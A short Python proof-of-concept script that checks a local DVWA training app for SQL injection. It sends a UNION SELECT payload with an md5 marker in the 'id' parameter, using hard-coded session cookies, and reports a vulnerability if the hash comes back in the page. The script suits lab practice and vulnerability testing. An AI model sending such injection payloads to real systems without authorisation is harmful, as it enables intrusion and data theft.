"""
 @Author: UpDown
 @FileName: dvwa_sql_poc.py
 @Time: 2022/5/8 21:36
"""

import requests
import hashlib
import random

cookies = {
    'security': 'low',
    'csrftoken': '4lCBHKyNLGNb644Bqq7oQgGZ0krFoAZz6f2AnIRdsOZc2c0G9D663b5Ef9szAl3Q',
    'PHPSESSID': 'uq88rfp3bvf77kqnrvjsteafb0',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    # Requests sorts cookies= alphabetically
    # 'Cookie': 'security=low; csrftoken=4lCBHKyNLGNb644Bqq7oQgGZ0krFoAZz6f2AnIRdsOZc2c0G9D663b5Ef9szAl3Q; PHPSESSID=uq88rfp3bvf77kqnrvjsteafb0',
    'Referer': 'http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

num1 = str(random.random())
params = {
    'id': f"-1\' union select 1,md5({num1}) -- +",
    'Submit': 'Submit',
}
md = hashlib.md5()
md.update(num1.encode('utf-8'))
print(md.hexdigest())
# print(params)
response = requests.get('http://127.0.0.1/dvwa/vulnerabilities/sqli/', params=params, cookies=cookies, headers=headers)
# print(response.text)
if md.hexdigest() in response.text:
    print('存在sql注入漏洞' )